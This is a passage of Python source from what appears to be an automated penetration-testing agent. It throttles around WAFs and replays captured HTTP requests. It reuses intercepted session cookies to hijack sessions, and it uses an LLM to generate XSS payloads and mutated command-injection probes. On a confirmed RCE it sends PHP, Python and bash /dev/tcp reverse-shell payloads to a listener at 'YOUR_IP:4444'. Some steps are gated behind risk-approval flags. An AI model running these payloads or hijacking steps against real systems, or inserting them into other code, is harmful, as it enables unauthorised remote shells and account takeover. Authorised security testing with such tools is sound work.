    def _adapt_rate_limit_from_results(self, state: AgentState, results: List[Any]) -> None:
        if self._normalized_safety_profile(state) == "aggressive":
            return
        saw_rate_limit = False
        for result in results or []:
            if not isinstance(result, dict):
                continue
            blob = " ".join([
                str(result.get("status", "")),
                str(result.get("message", "")),
                str(result.get("details", "")),
            ]).lower()
            if "429" in blob or "rate limit" in blob or "too many requests" in blob:
                saw_rate_limit = True
                break
        if not saw_rate_limit:
            return
        delay_min, delay_max = self._action_delay_bounds(state)
        if self._discreet_mode(state):
            state.request_delay_min = max(delay_min, 5.0)
            state.request_delay_max = max(delay_max, 15.0)
        else:
            state.request_delay_min = max(delay_min, 2.0)
            state.request_delay_max = max(delay_max, 6.0)
        if getattr(state, "verbose", False):
            print_warning("Rate limit signal detected; increasing agent delay window")

    def _result_waf_signal(self, result: Any) -> bool:
        return is_actionable_waf_signal(result)

    def _should_pause_campaign_for_waf(self, state: AgentState) -> bool:
        if self._normalized_safety_profile(state) == "aggressive":
            return False
        if approved_to_continue_through_waf(state):
            return False
        return True

    def _record_waf_signals_from_results(self, state: AgentState, results: List[Any], phase_name: str) -> bool:
        if self._normalized_safety_profile(state) == "aggressive":
            return False
        signals = [row for row in (results or []) if self._result_waf_signal(row)]
        if not signals:
            return False
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        risk = set(kb.get("risk_signals", []) or [])
        risk.add("waf_or_blocking_detected")
        kb["risk_signals"] = sorted(risk)
        kb["waf_signal_count"] = int(kb.get("waf_signal_count", 0) or 0) + len(signals)
        state.knowledge_base = kb
        threshold = 1 if self._normalized_safety_profile(state) in ("safe", "discreet") else 3
        if int(kb.get("waf_signal_count", 0) or 0) < threshold:
            return False

        delay_min, delay_max = self._action_delay_bounds(state)
        state.request_delay_min = max(delay_min, 5.0)
        state.request_delay_max = max(delay_max, 15.0)

        if not self._should_pause_campaign_for_waf(state):
            if getattr(state, "verbose", False) or approved_to_continue_through_waf(state):
                print_warning(
                    f"{phase_name}: WAF/CDN signals detected ({len(signals)}); "
                    "continuing with throttling (--approve-risk intrusive)"
                )
            return False

        state.campaign_stop_reason = (
            f"{phase_name}: blocking/WAF signals detected; pausing campaign to avoid target overload"
        )
        if getattr(state, "verbose", False):
            print_warning(state.campaign_stop_reason)
        return True

    def _has_proxy_request_intel(self, state: AgentState) -> bool:
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        intel = kb.get("request_intel", {}) if isinstance(kb.get("request_intel", {}), dict) else {}
        try:
            return int(intel.get("analyzed_flows", 0) or 0) > 0
        except Exception:
            return False

    def _merge_http_request_intel_into_kb(self, state: AgentState, summary: Dict[str, Any]) -> None:
        if not isinstance(summary, dict) or not isinstance(state.knowledge_base, dict):
            return
        kb = state.knowledge_base
        kb["request_intel"] = summary

        endpoints = set(kb.get("discovered_endpoints", []) or [])
        endpoints.update(str(x) for x in summary.get("discovered_endpoints", []) or [] if str(x).strip())
        kb["discovered_endpoints"] = sorted(endpoints)[:300]

        params = set(kb.get("discovered_params", []) or [])
        params.update(str(x).lower() for x in summary.get("discovered_params", []) or [] if str(x).strip())
        kb["discovered_params"] = sorted(params)[:200]

        login_paths = set(kb.get("login_paths", []) or [])
        login_paths.update(str(x) for x in summary.get("login_paths", []) or [] if str(x).startswith("/"))
        kb["login_paths"] = sorted(login_paths)[:40]

        tech_hints = set(kb.get("tech_hints", []) or [])
        for hint in summary.get("tech_hints", []) or []:
            hint_lower = str(hint or "").lower().strip()
            if hint_lower:
                tech_hints.add(hint_lower)
                if hint_lower in ("wordpress", "drupal", "joomla", "django", "flask", "nodejs", "nextjs", "api"):
                    self._update_tech_confidence(kb, hint_lower, 0.25)
                elif hint_lower in ("graphql", "swagger", "react", "angular", "vue", "phpmyadmin", "dvwa"):
                    self._update_tech_confidence(kb, hint_lower, 0.18)
        kb["tech_hints"] = sorted(tech_hints)

        risk = set(kb.get("risk_signals", []) or [])
        risk.update(str(x) for x in summary.get("risk_signals", []) or [] if str(x).strip())
        kb["risk_signals"] = sorted(risk)

        if getattr(state, "reuse_proxy_auth", False):
            auth_context = summary.get("auth_context", {})
            if isinstance(auth_context, dict) and auth_context:
                self._merge_auth_context(kb, auth_context, state=state)
                risk.add("session_cookie_observed")
                risk.add("authenticated_session")
                kb["risk_signals"] = sorted(risk)

        if summary.get("dom_xss_potential"):
            kb["dom_xss_potential"] = summary["dom_xss_potential"]
            risk = set(kb.get("risk_signals", []) or [])
            if any(x.get("is_likely_vulnerable") for x in summary["dom_xss_potential"]):
                risk.add("potential_dom_xss_detected")
            kb["risk_signals"] = sorted(risk)

        if summary.get("login_fidelity"):
            kb["login_fidelity"] = summary["login_fidelity"]
            for path, fidelity in summary["login_fidelity"].items():
                if fidelity.get("fidelity_class") == "low":
                    risk = set(kb.get("risk_signals", []) or [])
                    risk.add("suspicious_login_page_detected")
                    kb["risk_signals"] = sorted(risk)
                    break

        if summary.get("extracted_secrets"):
            kb["extracted_secrets"] = summary["extracted_secrets"]
            risk = set(kb.get("risk_signals", []) or [])
            risk.add("leaked_secrets_detected")
            caps = set(kb.get("unlocked_capabilities", []) or [])
            for secret in summary["extracted_secrets"]:
                if secret["type"] in ("jwt", "bearer_token"):
                    caps.add("session_cookie")
                elif secret["type"] == "aws_key":
                    caps.add("cloud_credentials")
            kb["unlocked_capabilities"] = sorted(caps)
            kb["risk_signals"] = sorted(risk)

        if summary.get("timing_anomalies"):
            kb["timing_anomalies"] = summary["timing_anomalies"]
            risk = set(kb.get("risk_signals", []) or [])
            risk.add("timing_side_channel_detected")
            kb["risk_signals"] = sorted(risk)

        if summary.get("active_probe"):
            risk = set(kb.get("risk_signals", []) or [])
            risk.add("active_web_probe_completed")
            kb["risk_signals"] = sorted(risk)

        self._promote_corroborated_web_apps(kb)
        state.knowledge_base = kb

    def _endpoint_matches_app_prefix(self, endpoints: Any, prefixes: Tuple[str, ...]) -> bool:
        """True when any discovered endpoint is under one of the app path prefixes."""
        for raw in endpoints or []:
            path = str(raw or "").strip().lower().split("?", 1)[0]
            if not path.startswith("/"):
                path = "/" + path
            for prefix in prefixes:
                token = str(prefix or "").strip().lower()
                if not token:
                    continue
                if not token.startswith("/"):
                    token = "/" + token
                base = token.rstrip("/") or "/"
                if path == base or path == base + "/" or path.startswith(base + "/"):
                    return True
        return False

    def _floor_tech_confidence(self, knowledge_base: Dict[str, Any], tech_key: str, floor: float) -> None:
        if not isinstance(knowledge_base, dict) or not tech_key:
            return
        confidence = dict(knowledge_base.get("tech_confidence", {}) or {})
        key = str(tech_key).lower()
        current = float(confidence.get(key, 0.0) or 0.0)
        confidence[key] = round(max(current, float(floor)), 3)
        knowledge_base["tech_confidence"] = confidence

    def _promote_corroborated_web_apps(self, knowledge_base: Dict[str, Any]) -> None:
        """
        Promote known training/web apps when path evidence corroborates weak string hints.

        Homepage links like ``<a href="/dvwa/">DVWA</a>`` already produce endpoints +
        tech_hints at +0.18 each merge (~0.36). Without a path floor, DVWA never reaches
        the exploit/planner gates (0.45–0.7) while Drupal/WordPress get CMS floors.
        """
        if not isinstance(knowledge_base, dict):
            return
        endpoints = list(knowledge_base.get("discovered_endpoints", []) or [])
        hints = {str(h).lower().strip() for h in (knowledge_base.get("tech_hints", []) or []) if str(h).strip()}
        login_paths = {str(p) for p in (knowledge_base.get("login_paths", []) or []) if str(p).startswith("/")}
        endpoint_set = {str(e) for e in endpoints if str(e).strip()}

        if self._endpoint_matches_app_prefix(endpoints, ("/dvwa",)) or "dvwa" in hints:
            if self._endpoint_matches_app_prefix(endpoints, ("/dvwa",)):
                hints.add("dvwa")
                self._floor_tech_confidence(knowledge_base, "dvwa", 0.78)
                login_paths.add("/dvwa/login.php")
                endpoint_set.update({"/dvwa/", "/dvwa/login.php"})
                risk = set(knowledge_base.get("risk_signals", []) or [])
                risk.add("login_surface_detected")
                knowledge_base["risk_signals"] = sorted(risk)
            elif "dvwa" in hints:
                self._floor_tech_confidence(knowledge_base, "dvwa", 0.45)

        if self._endpoint_matches_app_prefix(endpoints, ("/phpmyadmin",)) or "phpmyadmin" in hints:
            if self._endpoint_matches_app_prefix(endpoints, ("/phpmyadmin",)):
                hints.add("phpmyadmin")
                self._floor_tech_confidence(knowledge_base, "phpmyadmin", 0.75)
                login_paths.add("/phpMyAdmin/")
                endpoint_set.update({"/phpMyAdmin/", "/phpmyadmin/"})

        if self._endpoint_matches_app_prefix(endpoints, ("/mutillidae",)):
            hints.add("mutillidae")
            self._floor_tech_confidence(knowledge_base, "mutillidae", 0.7)
            endpoint_set.add("/mutillidae/")

        knowledge_base["tech_hints"] = sorted(hints)
        knowledge_base["login_paths"] = sorted(login_paths)[:40]
        knowledge_base["discovered_endpoints"] = sorted(endpoint_set)[:300]

    def _shell_sensitive_probes_allowed(self, state: AgentState) -> bool:
        """True when shell-tier probe paths (/.env, /phpinfo, …) are explicitly approved."""
        shell_mode = (
            is_shell_operator_goal(self._operator_campaign_goal(state))
            or bool(getattr(state, "shell_hunter", False))
        )
        if not shell_mode:
            return False
        policy = getattr(state, "runtime_policy", None)
        if policy is None:
            return False
        from interfaces.command_system.builtin.agent.runtime_policy import ModuleRisk

        risk = ModuleRisk(
            "intrusive",
            ("active_exploitation",),
            1,
            False,
            True,
            False,
            "shell-tier active web probes",
        )
        return bool(policy.risk_approved(risk))

    def _resolve_active_probe_paths_for_state(
        self,
        state: AgentState,
        *,
        extra_paths: Optional[List[str]] = None,
        limit: int = 14,
    ) -> Tuple[List[str], str]:
        shell_mode = (
            is_shell_operator_goal(self._operator_campaign_goal(state))
            or bool(getattr(state, "shell_hunter", False))
        )
        return resolve_active_probe_paths(
            shell_mode=shell_mode,
            intrusive_approved=self._shell_sensitive_probes_allowed(state),
            extra_paths=extra_paths,
            limit=limit,
        )

    def _active_web_probe_result(self, row: Dict[str, Any]) -> Dict[str, Any]:
        if not isinstance(row, dict):
            row = {}
        path = row.get("path") or row.get("url") or ""
        status = str(row.get("status") or "ok")
        if status == "ok":
            message = (
                f"Active web probe GET {path} -> {row.get('status_code')} "
                f"({row.get('response_length', 0)} bytes) "
                f"[{', '.join(row.get('reasons', [])[:3])}]"
            )
            result_status = "safe"
        elif status == "blocked":
            message = f"Active web probe blocked for {path}: {row.get('error', '')}"
            result_status = "skipped"
        else:
            message = f"Active web probe failed for {path}: {row.get('error', 'unknown error')}"
            result_status = "error"
        return {
            "module": "Active web surface probe",
            "path": "agent/active_web_probe",
            "status": result_status,
            "vulnerable": False,
            "severity": "info",
            "message": message,
            "details": dict(row),
        }

    def _run_active_web_surface_probe(
        self,
        state: AgentState,
        *,
        extra_paths: Optional[List[str]] = None,
        max_requests: int = 12,
    ) -> Tuple[Dict[str, Any], List[Dict[str, Any]]]:
        """Send direct GET probes when proxy traffic is thin or shell goal needs more surface."""
        if state.dry_run:
            return {}, []
        if state.target_reachable is False:
            return {}, []

        def _budget() -> bool:
            return self._consume_network_units(state, 1)

        paths, tier = self._resolve_active_probe_paths_for_state(
            state,
            extra_paths=extra_paths,
            limit=max(1, int(max_requests or 1)),
        )
        summary = self._http_intel.probe_direct_surface(
            state.target_info or {},
            probe_paths=paths,
            limit=len(paths),
            user_agent=str(getattr(state, "user_agent", "") or ""),
            on_request=_budget,
            on_throttle=lambda probe_path: self._throttle_active_web_probe(state, probe_path),
        )
        summary["probe_tier"] = tier
        analyzed = int(summary.get("analyzed_flows", 0) or 0)
        if analyzed <= 0:
            return summary, []

        self._merge_http_request_intel_into_kb(state, summary)
        results = [self._active_web_probe_result(row) for row in (summary.get("probe_results") or []) if isinstance(row, dict)]
        self._append_timeline_event(
            state,
            "request-intel",
            (
                f"Active web probe: {analyzed} GET request(s), "
                f"{len(summary.get('discovered_endpoints', []) or [])} endpoint hint(s)."
            ),
            kind="probe",
            extra={"interesting": len(summary.get("interesting_requests", []) or [])},
        )
        return summary, results

    def _http_request_intel_result(self, row: Dict[str, Any]) -> Dict[str, Any]:
        if not isinstance(row, dict):
            row = {}
        status = str(row.get("status") or "ok")
        status_code = row.get("status_code")
        path = row.get("path") or row.get("url") or ""
        if status == "ok":
            message = (
                f"Verified captured HTTP request {row.get('method', 'GET')} {path} "
                f"-> {status_code} ({row.get('response_length', 0)} bytes)"
            )
            result_status = "safe"
        elif status == "skipped":
            message = f"Skipped captured HTTP request {path}: {row.get('error', 'not eligible')}"
            result_status = "skipped"
        else:
            message = f"Captured HTTP request replay failed for {path}: {row.get('error', 'unknown error')}"
            result_status = "error"
        return {
            "module": "HTTP request intelligence",
            "path": "agent/http_request_intel",
            "status": result_status,
            "vulnerable": False,
            "severity": "info",
            "message": message,
            "details": dict(row),
        }

    def _run_http_request_replay(self, state: AgentState, summary: Dict[str, Any]) -> List[Dict[str, Any]]:
        mode = str(getattr(state, "http_replay", "safe") or "safe").strip().lower()
        if mode == "off":
            return []
        candidates = [
            row for row in (summary.get("candidate_requests", []) or [])
            if isinstance(row, dict)
        ]
        if mode == "safe":
            candidates = [row for row in candidates if row.get("replay_safe")]
        if not candidates:
            return []

        max_replay = max(0, int(getattr(state, "http_replay_max", 3) or 0))
        if is_shell_operator_goal(self._operator_campaign_goal(state)):
            max_replay = max(max_replay, 8)
        if max_replay <= 0:
            return []
        selected = candidates[:max_replay]
        sent_rows: List[Dict[str, Any]] = []
        results: List[Dict[str, Any]] = []

        print_status(f"HTTP request intelligence: replaying {len(selected)} captured request candidate(s)")
        for candidate in selected:
            if not self._consume_network_units(state, 1):
                row = {
                    "status": "skipped",
                    "flow_id": candidate.get("flow_id"),
                    "method": candidate.get("method"),
                    "url": candidate.get("url"),
                    "path": candidate.get("path"),
                    "error": "request budget exhausted before HTTP replay",
                }
            else:
                self._sleep_between_agent_actions(
                    state,
                    f"http-replay:{candidate.get('path') or candidate.get('url')}",
                )
                kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
                waf_detected = "waf_or_blocking_detected" in kb.get("risk_signals", [])
                
                row = self._http_intel.send_candidate(
                    candidate,
                    mode=mode,
                    timeout=8.0,
                    include_sensitive_headers=bool(getattr(state, "reuse_proxy_auth", False)),
                    evasion=waf_detected,
                )
            sent_rows.append(row)
            results.append(self._http_request_intel_result(row))
            if self._record_waf_signals_from_results(
                state,
                [{
                    "status_code": row.get("status_code"),
                    "body": "",
                    "details": row,
                }],
                "http-request-intel",
            ):
                break

            # Session Hijacking Test
            if mode == "active" and row.get("status") == "ok" and candidate.get("has_sensitive_headers"):
                headers = candidate.get("headers", {})
                cookies = self._http_intel._parse_cookie_header(self._http_intel._header_value(headers, "Cookie"))
                if cookies:
                    print_status("HTTP request intelligence: testing intercepted session cookies validity...")
                    session_results = self._http_intel.test_session_validity(cookies, candidate.get("url"))
                    if session_results:
                        for ep, s_res in session_results.items():
                            print_success(f"Session hijacked: accessed {ep} (is_admin={s_res['is_admin']})")
                            kb = state.knowledge_base
                            caps = set(kb.get("unlocked_capabilities", []) or [])
                            caps.add("session_cookie")
                            if s_res["is_admin"]:
                                caps.add("admin_access")
                            kb["unlocked_capabilities"] = sorted(caps)
                            state.knowledge_base = kb
                            results.append({
                                "module": "Session Hijacking",
                                "path": "agent/session_hijack",
                                "status": "vulnerable",
                                "vulnerable": True,
                                "severity": "high",
                                "message": f"Successfully hijacked session to access {ep}",
                                "details": s_res
                            })

            # Active Canary Probing for DOM XSS
            if mode == "active" and candidate.get("dom_xss_potential"):
                for xss in candidate["dom_xss_potential"]:
                    if not xss.get("is_likely_vulnerable"):
                        continue
                    param = xss.get("param")
                    if not param:
                        continue
                    
                    if not self._consume_network_units(state, 1):
                        break
                        
                    print_status(f"HTTP request intelligence: triggering canary probe for parameter `{param}`")
                    canary_res = self._http_intel.probe_reflection_canary(candidate, param, mode=mode)
                    if canary_res.get("reflection_confirmed"):
                        print_success(f"DOM XSS confirmation: canary reflected for `{param}` in {canary_res.get('canary_contexts', [])}")
                        results.append({
                            "module": "DOM XSS Confirmation",
                            "path": "agent/dom_xss_canary",
                            "status": "vulnerable",
                            "vulnerable": True,
                            "severity": "high",
                            "message": f"Confirmed reflection for parameter `{param}` in {canary_res.get('canary_contexts', [])}",
                            "details": canary_res
                        })
                        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
                        risk = set(kb.get("risk_signals", []) or [])
                        risk.add("confirmed_dom_xss")
                        kb["risk_signals"] = sorted(risk)
                        state.knowledge_base = kb

                    # Adaptive LLM Payload
                    if (
                        xss.get("contexts")
                        and getattr(state, "llm_local", False)
                        and not llm_budget_exhausted(state)
                    ):
                        context_str = ", ".join(xss["contexts"])
                        llm_model = resolve_llm_model(state)
                        self._http_intel.configure_llm(
                            endpoint=state.llm_endpoint,
                            model=llm_model,
                        )
                        state.metrics.llm_calls += 1
                        llm_payload = self._http_intel.generate_adaptive_payload(
                            context_str,
                            param,
                            llm_endpoint=state.llm_endpoint,
                            llm_model=llm_model,
                        )
                        if llm_payload:
                            if not self._consume_network_units(state, 1):
                                break
                            print_status(f"HTTP request intelligence: triggering LLM-crafted payload probe for `{param}`")
                            llm_res = self._http_intel.probe_reflection_canary(candidate, param, canary=llm_payload, mode=mode)
                            if llm_res.get("reflection_confirmed"):
                                print_success(f"Confirmed XSS with LLM payload: `{llm_payload[:40]}`")
                                results.append({
                                    "module": "LLM Adaptive XSS",
                                    "path": "agent/llm_xss_probe",
                                    "status": "vulnerable",
                                    "vulnerable": True,
                                    "severity": "critical",
                                    "message": f"Confirmed XSS for parameter `{param}` using LLM payload",
                                    "details": llm_res
                                })

            # Shell Hunter: Command Injection Probing
            rce_markers = ("command injection", "command injection candidate", "rce")
            if state.shell_hunter and mode == "active" and any(
                r in (row.get("reasons", []) or []) for r in rce_markers
            ):
                param = next(iter(candidate.get("params", {}).keys()), None)
                if param:
                    from interfaces.command_system.builtin.agent.http_intelligence import PayloadMutationEngine
                    mutator = PayloadMutationEngine()
                    mutated = mutator.mutate_command("echo ksploit_rce_check")
                    for mut_payload in mutated[:5]:
                        if not self._consume_network_units(state, 1):
                            break
                        print_status(f"Shell Hunter: triggering mutated RCE probe for `{param}` -> `{mut_payload}`")
                        mut_res = self._http_intel.probe_reflection_canary(candidate, param, canary=mut_payload, mode=mode)
                        if mut_res.get("status") == "ok" and "ksploit_rce_check" in mut_res.get("response_body", ""):
                            print_success(f"Shell Hunter: CONFIRMED RCE for `{param}` with payload `{mut_payload}`")
                            results.append({
                                "module": "RCE Confirmation",
                                "path": "agent/rce_mutation_probe",
                                "status": "vulnerable",
                                "vulnerable": True,
                                "severity": "critical",
                                "message": f"Confirmed RCE for parameter `{param}` with payload `{mut_payload}`",
                                "details": mut_res
                            })
                            # Attempt automated shell delivery
                            shell_res = self._attempt_shell_delivery(state, candidate, param)
                            if shell_res:
                                results.append(shell_res)
                            break

        summary["sent_requests"] = sent_rows[:12]
        if isinstance(state.knowledge_base, dict):
            state.knowledge_base["request_intel"] = summary
        return results

    def _ingest_http_request_intelligence(self, state: AgentState) -> List[Dict[str, Any]]:
        if state.shell_hunter:
            kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
            kb["shell_hunter_mode"] = True
            state.knowledge_base = kb

        proxy_enabled = bool(getattr(state, "proxy_flows", True))
        if proxy_enabled:
            summary = self._http_intel.collect_from_proxy(
                state.target_info or {},
                limit=max(0, int(getattr(state, "proxy_flow_limit", 40) or 0)),
                include_auth_context=bool(getattr(state, "reuse_proxy_auth", False)),
            )
            if not isinstance(summary, dict):
                summary = self._http_intel.empty_summary(enabled=True)
            if summary.get("error") and getattr(state, "verbose", False):
                print_warning(str(summary.get("error")))
        else:
            summary = self._http_intel.empty_summary(enabled=True)
            summary["source"] = "proxy_disabled"

        proxy_flows = int(summary.get("analyzed_flows", 0) or 0)
        if proxy_flows > 0:
            self._merge_http_request_intel_into_kb(state, summary)

        operator_shell = is_shell_operator_goal(self._operator_campaign_goal(state))
        shell_hunter = bool(getattr(state, "shell_hunter", False))
        shell_mode = operator_shell or shell_hunter
        kb = state.knowledge_base if isinstance(state.knowledge_base, dict) else {}
        endpoint_count = len(kb.get("discovered_endpoints", []) or [])
        active_results: List[Dict[str, Any]] = []

        should_active_probe = proxy_flows <= 0 or (shell_mode and endpoint_count < 8)
        if should_active_probe:
            if proxy_flows <= 0 and getattr(state, "verbose", False):
                if shell_mode and self._shell_sensitive_probes_allowed(state):
                    print_info(
                        "HTTP intelligence: no KittyProxy flows; active GET probes "
                        "(safe + shell-tier paths approved)."
                    )
                elif shell_mode:
                    print_info(
                        "HTTP intelligence: no KittyProxy flows; active GET probes "
                        "(safe paths only — use --approve-risk intrusive for /.env, /phpinfo, etc.)."
                    )
                else:
                    print_info("HTTP intelligence: no KittyProxy flows; sending safe GET surface probes.")
            if shell_mode and self._shell_sensitive_probes_allowed(state):
                probe_limit = 14
            elif shell_mode:
                probe_limit = 10
            else:
                probe_limit = 8
            active_summary, active_results = self._run_active_web_surface_probe(
                state,
                max_requests=probe_limit,
            )
            if int(active_summary.get("analyzed_flows", 0) or 0) > 0:
                summary = self._http_intel.merge_intel_summaries(summary, active_summary)
                self._merge_http_request_intel_into_kb(state, summary)

        if int(summary.get("analyzed_flows", 0) or 0) <= 0:
            return active_results

        print_status(
            "HTTP request intelligence: "
            f"{summary.get('analyzed_flows', 0)} flow(s), "
            f"{len(summary.get('discovered_endpoints', []) or [])} endpoint(s), "
            f"{len(summary.get('discovered_params', []) or [])} param(s)"
        )
        if getattr(state, "reuse_proxy_auth", False) and summary.get("auth_context"):
            print_info("HTTP request intelligence: captured Cookie context is available for modules.")
        if getattr(state, "verbose", False):
            top = summary.get("interesting_requests", []) or []
            for row in top[:5]:
                print_info(
                    f"- {row.get('method')} {row.get('path')} "
                    f"status={row.get('status_code')} reasons={', '.join(row.get('reasons', [])[:3])}"
                )
        self._append_timeline_event(
            state,
            "request-intel",
            (
                f"Imported {summary.get('analyzed_flows', 0)} KittyProxy flow(s), "
                f"{len(summary.get('interesting_requests', []) or [])} interesting request(s)."
            ),
            kind="analysis",
            extra={
                "endpoints": len(summary.get("discovered_endpoints", []) or []),
                "params": len(summary.get("discovered_params", []) or []),
                "replay_mode": getattr(state, "http_replay", "safe"),
            },
        )
        return active_results + self._run_http_request_replay(state, summary)

    def _attempt_shell_delivery(self, state: AgentState, candidate: Dict[str, Any], param: str) -> Optional[Dict[str, Any]]:
        """Attempt to deliver a reverse shell payload to a confirmed RCE endpoint."""
        print_status(f"Shell Hunter: attempting automated reverse shell delivery for `{param}`...")
        
        # Simple heuristics for target language
        tech_hints = " ".join(state.knowledge_base.get("tech_hints", [])).lower()
        payloads = []
        
        # We need a listener IP (local) - ideally provided by the user or detected
        # For now, we'll use a placeholder and warn the user
        lhost = "YOUR_IP"
        lport = "4444"
        
        if "php" in tech_hints or ".php" in str(candidate.get("url")):
            payloads.append(f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        
        if "python" in tech_hints:
            payloads.append(f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
            
        payloads.append(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
        
        for p in payloads:
            if not self._consume_network_units(state, 1):
                break
            print_status(f"Shell Hunter: trying reverse shell payload -> `{p[:50]}...`")
            res = self._http_intel.probe_reflection_canary(candidate, param, canary=p, mode="active")
            # We can't easily confirm the shell here without a listener, 
            # but we can return a success message if the request was accepted
            if res.get("status") == "ok":
                print_info(f"Shell Hunter: Payload sent. Start a listener on your machine: `nc -lvp {lport}`")
                return {
                    "module": "Automated Shell Delivery",
                    "path": "agent/shell_delivery",
                    "status": "safe",
                    "vulnerable": True,
                    "severity": "critical",
                    "message": f"Reverse shell payload delivered for `{param}`. Check your listener on {lhost}:{lport}",
                    "details": res
                }
        return None

    def _post_exploitation_loop(self, state: AgentState):
        """Run explicit post-exploitation objectives on verified sessions."""
        from interfaces.command_system.builtin.agent.post_exploit_goals import PostExploitGoalEngine

        policy = getattr(state, "runtime_policy", None)
        if policy is None or not getattr(policy, "approve_post_exploit", False):
            return
        if not (getattr(state, "verified_sessions", None) or state.new_sessions):
            return
        print_status("Starting post-exploitation objective pipeline...")
        report = PostExploitGoalEngine(self.framework).run(
            state,
            timeline_hook=self._append_timeline_event,
        )
        if report.all_complete:
            print_success(f"Post-exploitation objectives met ({len(report.missions)} session(s)).")
        elif report.missions:
            print_info(
                f"Post-exploitation partial: "
                f"{sum(1 for m in report.missions if m.complete)}/{len(report.missions)} complete."
            )

    def _append_timeline_event(
        self,
        state: AgentState,
        phase: str,
        summary: str,
        *,
        kind: str = "phase",
        modules: Optional[List[Any]] = None,
        results: Optional[List[Dict[str, Any]]] = None,
        extra: Optional[Dict[str, Any]] = None,
    ) -> None:
        self._lifecycle.append_timeline_event(
            state,
            phase,
            summary,
            kind=kind,
            modules=modules,
            results=results,
            extra=extra,
            is_actionable_finding=self._is_actionable_finding,
        )

    def _apply_refutation_panel(self, state: AgentState, findings: List[Any]) -> List[Any]:
        """Run skeptic refutation panel on high-severity contextual findings."""
        if not findings:
            return findings
        try:
            from interfaces.command_system.builtin.agent.refutation_panel import refute_findings_batch
            from interfaces.command_system.builtin.agent.strategic_llm_policy import resolve_llm_model
        except Exception:
            return findings

        llm = self._llm if getattr(state, "llm_local", False) else None
        refuted = refute_findings_batch(
            findings,
            llm_service=llm,
            llm_endpoint=str(getattr(state, "llm_endpoint", "") or ""),
            llm_model=resolve_llm_model(state),
            refuters=3,
            min_severity="medium",
            max_findings=6,
            llm_budget_remaining=lambda: llm_budget_remaining(state),
            on_llm_call=lambda: setattr(
                state.metrics,
                "llm_calls",
                int(getattr(state.metrics, "llm_calls", 0) or 0) + 1,
            ),
        )
        refuted_count = sum(1 for row in refuted if row.get("refutation_blocked"))
        if refuted_count:
            print_warning(f"Refutation panel blocked {refuted_count} overclaimed finding(s).")
        self._append_timeline_event(
            state,
            "analyze",
            f"Refutation panel: {len(refuted)} reviewed, {refuted_count} downgraded.",
            kind="finding",
            extra={"refuted_count": refuted_count, "reviewed": len(refuted)},
        )
        by_key = {
            (str(r.get("path") or ""), str(r.get("message") or "")[:120]): r
            for r in refuted
        }
        merged: List[Any] = []
        for row in findings:
            if not isinstance(row, dict):
                merged.append(row)
                continue
            key = (str(row.get("path") or ""), str(row.get("message") or "")[:120])
            merged.append(by_key.get(key, row))
        return merged

    def _emit_phase_operator_event(self, state: AgentState, phase: str) -> None:
        """Record which operator archetype is active for a workflow phase."""
        try:
            from interfaces.command_system.builtin.agent.operator_archetypes import (
                operator_context_for_phase,
            )

            op = operator_context_for_phase(
                phase,
                campaign_goal=str(getattr(state, "campaign_goal", "") or ""),
            )
            self._append_timeline_event(
                state,
                phase,
                f"Operator active: {op.get('name', 'Coordinator')} ({op.get('archetype', '')})",
                kind="phase_start",
                extra={"operator": op},
            )
        except Exception:
            pass

    def _print_timeline_preview(self, state: AgentState, tail: int = 6) -> None:
        rows = state.decision_timeline[-tail:] if isinstance(state.decision_timeline, list) else []
        if not rows:
            return
        print_status("Decision timeline")
        for row in rows:
            if not isinstance(row, dict):
                continue
            phase = str(row.get("phase", "?"))
            summary = self._shorten_text(row.get("summary", ""), 140)
            print_info(f"- {phase}: {summary}")

    def _is_network_error_result(self, result: Any) -> bool:
        if not isinstance(result, dict):
            return False
        blob = " ".join([
            str(result.get("message", "")),
            str(result.get("status", "")),
            str(result.get("error", "")),
            str(result.get("details", "")),
        ]).lower()
        return any(marker in blob for marker in self._network_error_markers())

    @staticmethod
    def _hostname_is_osint_domain(hostname: str) -> bool:
        """True when *hostname* looks like a DNS name (not a bare IP)."""
        host = str(hostname or "").strip().lower().strip(".")
        if host.startswith("www."):
            host = host[4:]
        if not host or "." not in host:
            return False
        try:
            ipaddress.ip_address(host)
            return False
        except ValueError:
            return True

    _LIVE_TARGET_OSINT_MARKERS: Tuple[str, ...] = (
        "domain_surface_mapper",
        "web_surface_harvester",
        "js_endpoint_extractor",
        "js_sourcemap_analyzer",
        "openapi_swagger_finder",
        "favicon_http_fingerprint",
        "url_headers",
        "webhook_api_leak",
        "hidden_metadata_hunter",
        "secret_leak_access_validator",
    )

    def _unreachable_target_module_skip_reason(
        self,
        state: AgentState,
        module_path: Any,
    ) -> str:
        if state.target_reachable is not False:
            return ""
        path = str(module_path or "").lower()
        stop_reason = str(state.campaign_stop_reason or "")
        if stop_reason == "target_unreachable_passive_only" and "/osint/" in path:
            if any(token in path for token in self._LIVE_TARGET_OSINT_MARKERS):
                return "target unreachable: skipping live HTTP OSINT module"
            return ""
        if "/scanner/" in path or "crawler" in path or "/auxiliary/scanner/" in path:
            return "target unreachable: skipping active scan module"
        if "/osint/" in path and not self._hostname_is_osint_domain(
            str((state.target_info or {}).get("hostname", "") or "")
        ):
            return "target unreachable: OSINT requires a domain target"
        return "target unreachable: skipping target-facing module"

    def _probe_target_reachability(self, state: AgentState) -> Tuple[bool, str]:
        target_info = state.target_info or {}
        host = str(target_info.get("hostname", "") or "").strip()
        scheme = str(target_info.get("scheme", "http") or "http").lower()
        port = int(target_info.get("port", 443 if scheme == "https" else 80) or (443 if scheme == "https" else 80))
        path = str(target_info.get("path", "") or "").strip() or "/"

        if not host:
            return False, "Missing target hostname."

        try:
            with socket.create_connection((host, port), timeout=2.5):
                pass
        except OSError as exc:
            return False, f"{host}:{port} unreachable: {exc}"

        if scheme not in ("http", "https"):
            return True, f"TCP port {port} reachable."

        url = f"{scheme}://{host}:{port}{path if path.startswith('/') else '/' + path}"
        row = self._http_probe_many(state, [url], timeout_s=4, read_bytes=2048)[0]
